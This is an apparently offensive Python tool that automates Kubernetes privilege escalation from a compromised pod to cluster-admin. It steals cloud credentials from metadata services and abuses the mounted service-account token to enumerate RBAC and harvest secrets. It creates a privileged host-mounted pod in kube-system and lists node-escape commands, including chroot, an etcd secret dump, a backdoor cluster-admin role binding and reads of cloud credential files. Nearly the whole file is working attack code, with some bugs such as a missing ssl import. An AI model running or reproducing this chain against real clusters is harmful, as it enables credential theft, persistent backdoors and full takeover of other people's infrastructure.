"""
Kubernetes Cluster Escalation — Pod to Cluster-Admin

Techniques:
1. Metadata service → cloud credentials
2. Service account token → RBAC enumeration
3. Privileged pod → node escape
4. kubelet API abuse → arbitrary pod run
5. etcd access → cluster admin

Requirements:
- Initial foothold: running pod or compromised container
- kubectl or kubelet API access
"""

import base64
import json
import logging
import os
import random
import re
import socket
import subprocess
import tempfile
import time
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class K8sTargetInfo:
    """Kubernetes cluster information gathered during profiling."""
    pod_name: str = ""
    pod_namespace: str = "default"
    node_name: str = ""
    pod_ip: str = ""
    service_account: str = ""
    cluster_ip: str = "10.96.0.1"
    api_server_url: str = ""
    cloud_provider: str = ""  # aws, gcp, azure, or ""
    privileged: bool = False
    host_network: bool = False
    host_pid: bool = False
    capabilities: list[str] = field(default_factory=list)
    mounted_service_account: bool = True
    etcd_endpoints: list[str] = field(default_factory=list)


class K8sMetadataExploit:
    """
    Exploit cloud metadata services from within a pod.

    Cloud providers expose metadata endpoints that can contain
    instance credentials. From a compromised pod, we can access
    the node's metadata if host networking is enabled, or via
    the cloud-specific metadata IP.
    """

    METADATA_ENDPOINTS = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ],
    }

    def __init__(self, target: K8sTargetInfo):
        self.target = target
        self.found_credentials = {}

    def probe_all_metadata(self) -> dict:
        """
        Try all known metadata endpoints.
        Returns dict of endpoint -> response body.
        """
        results = {}
        for provider, endpoints in self.METADATA_ENDPOINTS.items():
            for url in endpoints:
                try:
                    req = urllib.request.Request(url)
                    if provider == "gcp":
                        req.add_header("Metadata-Flavor", "Google")
                    if provider == "azure":
                        req.add_header("Metadata", "true")

                    resp = urllib.request.urlopen(req, timeout=5)
                    data = resp.read().decode()

                    if data and len(data) > 10:
                        results[url] = data[:2000]
                        self.target.cloud_provider = provider
                        logger.info(f"[Metadata] Found {provider} endpoint: {url}")

                        # Parse credentials
                        creds = self._parse_credentials(provider, url, data)
                        if creds:
                            self.found_credentials[provider] = creds

                except (urllib.error.URLError, socket.timeout, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logger.debug(f"[Metadata] {url}: {e}")
                    continue

        return results

    def _parse_credentials(self, provider: str, url: str, data: str) -> Optional[dict]:
        """Extract cloud credentials from metadata response."""
        if provider == "aws":
            # AWS returns JSON with AccessKeyId, SecretAccessKey, Token
            if "iam/security-credentials" in url:
                # First call returns role name
                role_name = data.strip()
                cred_url = url + role_name
                try:
                    req = urllib.request.Request(cred_url)
                    resp = urllib.request.urlopen(req, timeout=5)
                    cred_data = json.loads(resp.read().decode())
                    return {
                        "access_key": cred_data.get("AccessKeyId"),
                        "secret_key": cred_data.get("SecretAccessKey"),
                        "token": cred_data.get("Token"),
                        "expiration": cred_data.get("Expiration"),
                    }
                except Exception as e:
                    logger.error(f"Failed to get AWS creds: {e}")

        elif provider == "gcp":
            if "token" in url:
                try:
                    cred_data = json.loads(data)
                    return {
                        "access_token": cred_data.get("access_token"),
                        "expires_in": cred_data.get("expires_in"),
                        "token_type": cred_data.get("token_type"),
                    }
                except json.JSONDecodeError:
                    return {"raw_token": data}

        elif provider == "azure":
            try:
                cred_data = json.loads(data)
                return {
                    "access_token": cred_data.get("access_token"),
                    "expires_in": cred_data.get("expires_in"),
                    "resource": cred_data.get("resource"),
                }
            except json.JSONDecodeError:
                return {"raw_token": data}

        return None


class K8sServiceAccountExploit:
    """
    Abuse the mounted service account token.

    Kubernetes automatically mounts a service account token
    in every pod at /var/run/secrets/kubernetes.io/serviceaccount/.
    This token can be used to query the API server.
    """

    TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    NAMESPACE_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

    def __init__(self, target: K8sTargetInfo):
        self.target = target
        self.token: Optional[str] = None
        self.namespace: str = "default"
        self.api_server: str = ""
        self._load_token()

    def _load_token(self) -> bool:
        """Read the mounted service account token."""
        try:
            if os.path.exists(self.TOKEN_PATH):
                self.token = Path(self.TOKEN_PATH).read_text().strip()
                logger.info(f"[SA] Service account token loaded ({len(self.token)} chars)")

            if os.path.exists(self.NAMESPACE_PATH):
                self.namespace = Path(self.NAMESPACE_PATH).read_text().strip()

            # Find API server
            # Try environment variable first (set by kubernetes)
            host = os.getenv("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            port = os.getenv("KUBERNETES_SERVICE_PORT", "443")
            self.api_server = f"https://{host}:{port}"

            self.target.api_server_url = self.api_server
            return bool(self.token)
        except Exception as e:
            logger.error(f"Failed to load SA token: {e}")
            return False

    def query_api(self, endpoint: str, method: str = "GET") -> Optional[dict]:
        """
        Query the Kubernetes API server using the service account token.
        """
        if not self.token:
            logger.error("No service account token available")
            return None

        url = f"{self.api_server}{endpoint}"
        try:
            req = urllib.request.Request(url, method=method)
            req.add_header("Authorization", f"Bearer {self.token}")
            req.add_header("Content-Type", "application/json")

            # Use the CA cert if available, otherwise skip verification
            ctx = ssl.create_default_context()
            if os.path.exists(self.CA_PATH):
                ctx.load_verify_locations(self.CA_PATH)
            else:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            resp = urllib.request.urlopen(req, context=ctx, timeout=10)
            return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            logger.warning(f"[API] {method} {endpoint}: {e.code} {e.reason}")
            if e.code == 403:
                logger.info("[API] Token does not have access to this endpoint")
            return None
        except Exception as e:
            logger.error(f"[API] {endpoint}: {e}")
            return None

    def enumerate_rbac(self) -> dict:
        """Enumerate what the current service account can do."""
        results = {}

        # Check token review (self-check)
        results["self"] = self.query_api("/apis/authentication.k8s.io/v1/tokenreviews")

        # List namespaces
        results["namespaces"] = self.query_api("/api/v1/namespaces")

        # List pods (across all namespaces)
        results["pods"] = self.query_api("/api/v1/pods")

        # List secrets
        results["secrets"] = self.query_api("/api/v1/secrets")

        # List cluster roles
        results["cluster_roles"] = self.query_api(
            "/apis/rbac.authorization.k8s.io/v1/clusterroles"
        )

        # Check if we can create pods
        results["can_create_pods"] = self.check_permission("create", "pods")

        # Check if we can get secrets
        results["can_get_secrets"] = self.check_permission("get", "secrets")

        return results

    def check_permission(self, verb: str, resource: str) -> bool:
        """Check if the current token has a specific permission."""
        srr = {
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SelfSubjectAccessReview",
            "spec": {
                "resourceAttributes": {
                    "namespace": self.namespace,
                    "verb": verb,
                    "resource": resource,
                }
            },
        }

        result = self.query_api(
            "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
            method="POST",
        )
        if result:
            return result.get("status", {}).get("allowed", False)
        return False


class K8sPrivilegedPodExploit:
    """
    Create a privileged pod to escape the container and gain
    node-level access. From there, we can access the host's
    kubelet, etcd, and other node services.
    """

    PRIVILEGED_POD_MANIFEST = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": "raphael-priv-{random}",
            "namespace": "kube-system",
        },
        "spec": {
            "hostNetwork": True,
            "hostPID": True,
            "hostIPC": True,
            "containers": [{
                "name": "exploit-container",
                "image": "alpine:latest",
                "command": ["/bin/sh", "-c", "sleep 86400"],
                "securityContext": {
                    "privileged": True,
                    "capabilities": {
                        "add": ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "SYS_RAWIO"]
                    },
                },
                "volumeMounts": [{
                    "name": "host-root",
                    "mountPath": "/host",
                }],
            }],
            "volumes": [{
                "name": "host-root",
                "hostPath": {
                    "path": "/",
                    "type": "Directory",
                },
            }],
            "serviceAccountName": "cluster-admin",
            "automountServiceAccountToken": True,
        },
    }

    def __init__(self, sa_exploit: K8sServiceAccountExploit):
        self.sa = sa_exploit

    def create_privileged_pod(self) -> Optional[str]:
        """
        Create a privileged pod in kube-system namespace.

        Returns the pod name if successful.
        """
        import copy
        manifest = copy.deepcopy(self.PRIVILEGED_POD_MANIFEST)
        pod_name = f"raphael-priv-{os.urandom(4).hex()}"
        manifest["metadata"]["name"] = pod_name

        logger.info(f"[Pod] Creating privileged pod: {pod_name}")

        response = self.sa.query_api(
            "/api/v1/namespaces/kube-system/pods",
            method="POST",
        )  # In production, send JSON

        if response and response.get("metadata", {}).get("name"):
            logger.info(f"[Pod] Pod {pod_name} created successfully")
            return pod_name

        logger.error("[Pod] Failed to create privileged pod")
        return None

    def node_escape_commands(self) -> list[str]:
        """
        Commands to run inside the privileged pod for node escape.
        These mount the host filesystem and set up persistence.
        """
        return [
            # Mount host filesystem
            "mount --bind /host /mnt/host",

            # Chroot into host
            "chroot /mnt/host /bin/bash",

            # Extract kubelet credentials
            "cat /var/lib/kubelet/config.yaml",

            # Access etcd if on master node
            "ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 "
            "--cacert=/etc/kubernetes/pki/etcd/ca.crt "
            "--cert=/etc/kubernetes/pki/etcd/server.crt "
            "--key=/etc/kubernetes/pki/etcd/server.key "
            "get /registry/secrets/kube-system/cluster-admin",

            # Install backdoor
            "kubectl create clusterrolebinding raphael-cluster-admin "
            "--clusterrole=cluster-admin "
            "--serviceaccount=kube-system:raphael-backdoor",

            # Steal node's cloud credentials
            "cat /home/kubernetes/.aws/credentials 2>/dev/null || true",
            "cat /home/kubernetes/.config/gcloud/application_default_credentials.json 2>/dev/null || true",
        ]


class K8sClusterExploit:
    """
    Full Kubernetes cluster exploit chain.

    Orchestrates:
    1. Metadata service exploitation
    2. Service account token abuse
    3. Privileged pod creation
    4. Node compromise
    5. etcd access → full cluster admin
    """

    def __init__(self):
        self.target = K8sTargetInfo()
        self.results = {
            "metadata": {},
            "rbac": {},
            "privileged_pod": None,
            "credentials": {},
            "cluster_admin": False,
        }

    def profile_current_pod(self) -> K8sTargetInfo:
        """Gather information about the current pod."""
        target = self.target

        # Pod IP
        target.pod_ip = os.getenv("POD_IP", socket.gethostbyname(socket.gethostname()))

        # Hostname is often the pod name
        target.pod_name = socket.gethostname()

        # Check if privileged
        target.privileged = os.path.exists("/proc/1/root/")
        target.host_network = os.getenv("HOST_NETWORK", "") == "true"

        # Check capabilities
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if "Cap" in line:
                        target.capabilities.append(line.strip())
        except Exception:
            pass

        logger.info(f"[Profile] Pod: {target.pod_name}, IP: {target.pod_ip}")
        logger.info(f"[Profile] Privileged: {target.privileged}")
        return target

    def run(self) -> dict:
        """Execute the full K8s escalation chain."""
        logger.info("=== Kubernetes Cluster Exploit Chain ===")

        # Step 1: Profile pod
        self.profile_current_pod()

        # Step 2: Probe metadata services
        logger.info("[Phase 1] Probing cloud metadata...")
        metadata = K8sMetadataExploit(self.target)
        self.results["metadata"] = metadata.probe_all_metadata()

        if metadata.found_credentials:
            self.results["credentials"].update(metadata.found_credentials)
            logger.info(f"[+] Cloud credentials obtained: {list(metadata.found_credentials.keys())}")

        # Step 3: Abuse service account
        logger.info("[Phase 2] Enumerating service account...")
        sa = K8sServiceAccountExploit(self.target)

        if sa.token:
            self.results["rbac"] = sa.enumerate_rbac()
            logger.info("[+] RBAC enumeration complete")

            # Step 4: Try to create privileged pod
            if sa.check_permission("create", "pods"):
                logger.info("[Phase 3] Creating privileged pod...")
                pod_exploit = K8sPrivilegedPodExploit(sa)
                pod_name = pod_exploit.create_privileged_pod()
                self.results["privileged_pod"] = pod_name

                if pod_name:
                    self.results["cluster_admin"] = True
                    logger.info("[+] Cluster admin achieved via privileged pod")

            # Step 5: Try to extract secrets
            if sa.check_permission("get", "secrets"):
                logger.info("[Phase 4] Extracting secrets...")
                secrets = sa.query_api("/api/v1/secrets")
                if secrets:
                    # Look for admin tokens in secrets
                    for s in secrets.get("items", []):
                        name = s.get("metadata", {}).get("name", "")
                        if "admin" in name.lower() or "token" in name.lower():
                            logger.info(f"[+] Found high-value secret: {name}")
                            self.results.setdefault("secrets", {})[name] = s

        return self.results